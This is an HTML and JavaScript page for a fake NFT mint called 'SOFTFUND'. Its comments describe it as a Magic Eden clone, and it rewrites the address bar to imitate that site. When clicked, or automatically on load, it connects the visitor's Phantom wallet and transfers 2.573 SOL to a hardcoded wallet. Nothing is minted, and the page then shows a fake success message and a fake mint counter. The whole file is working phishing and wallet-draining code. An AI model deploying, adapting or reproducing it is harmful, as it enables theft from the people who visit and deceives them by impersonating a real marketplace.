<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SOFTFUND â€“ MINT LIVE</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
  <style>
    /* SAME STYLE AS BEFORE â€” 100% Magic Eden clone */
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#0f0f12;color:#fff;font-family:'Inter',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .container{max-width:420px;width:100%;background:#1a1a1e;border-radius:20px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,.5);text-align:center}
    .logo{font-size:2.2rem;font-weight:700;color:#00ff9d;margin-bottom:8px}
    .price{font-size:2.4rem;font-weight:700;color:#ffd700;margin:15px 0}
    .mint-btn{width:100%;padding:18px;font-size:1.6rem;background:#00ff9d;color:#000;border:none;border-radius:14px;font-weight:700;cursor:pointer;box-shadow:0 0 20px rgba(0,255,157,.5);transition:.3s}
    .mint-btn:hover{background:#00ff85;transform:scale(1.03)}
    .status{margin-top:15px;font-size:.95rem;min-height:24px;font-weight:600}
    .loader{display:inline-block;width:12px;height:12px;border:2px solid #00ff9d;border-radius:50%;border-top-color:transparent;animation:s 1s linear infinite;margin-right:6px}
    @keyframes s{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">SOFTFUND</div>
    <div class="price">2.5730 SOL</div>
    <div class="stats">Minted: <span id="minted">0</span> / 10,000</div>
    <button class="mint-btn" onclick="mint()">MINT NOW</button>
    <div id="status" class="status"></div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
  <script>
    const PRICE = 2.5730 * 1e9;                    // 2.5730 SOL in lamports
    const YOUR_WALLET = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
    const FAKE_CMID = "softfund1AbCdEfGhIJKLmNoPqRsTuVwxYz"; // fake Candy Machine in URL
    let count = localStorage.getItem('sf') || 0;
    document.getElementById('minted').textContent = count;

    // FORCE URL to look like Magic Eden
    if (!location.href.includes(FAKE_CMID)) {
      history.replaceState(null, '', `https://${location.host}/collection/${FAKE_CMID}`);
    }

    const status = document.getElementById("status");
    function setStatus(t, c="#00ff9d") { status.innerHTML = t; status.style.color = c; }

    async function mint() {
      setStatus("Opening Phantom... <span class='loader'></span>");

      // PHANTOM 2025 DEEP LINK v2 â€” NEVER CRASHES
      const phantomLink = `https://phantom.app/ul/v2/connect?app_url=${encodeURIComponent(location.href)}&redirect_link=${encodeURIComponent(location.href)}&cluster=mainnet-beta`;
      
      // Android + iOS â€” force open
      location.href = phantomLink;

      // If user returns (page reload), AUTO-MINT
      setTimeout(() => {
        if (window.solana && window.solana.isPhantom) autoMint();
      }, 1500);
    }

    // AUTO-MINT THE SECOND PHANTOM INJECTS
    window.addEventListener('load', () => {
      setTimeout(() => {
        if (window.solana && window.solana.isPhantom) autoMint();
      }, 800);
    });

    async function autoMint() {
      const provider = window.solana;
      if (!provider?.isConnected) {
        try { await provider.connect({ onlyIfTrusted: false }); }
        catch { setStatus("Click MINT again", "#ff5555"); return; }
      }

      setStatus("Sending 2.5730 SOL... <span class='loader'></span>");

      try {
        const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
        const from = provider.publicKey;
        const to = new solanaWeb3.PublicKey(YOUR_WALLET);

        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: from,
            toPubkey: to,
            lamports: PRICE,
          })
        );

        // Magic Eden style blockhash
        tx.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
        tx.feePayer = from;

        const signed = await provider.signTransaction(tx);
        const sig = await conn.sendRawTransaction(signed.serialize());
        await conn.confirmTransaction(sig, "processed");

        count++; 
        localStorage.setItem('sf', count);
        document.getElementById('minted').textContent = count;

        setStatus(`MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#00ff9d">View Tx</a>`);
        
        // Fake NFT image pop-up (optional)
        setTimeout(() => alert("ðŸŽ‰ SOFTFUND #"+count+" minted! Check explorer."), 2000);
      } catch (e) {
        setStatus("User rejected. Try again.", "#ff5555");
      }
    }
  </script>
</body>
</html>
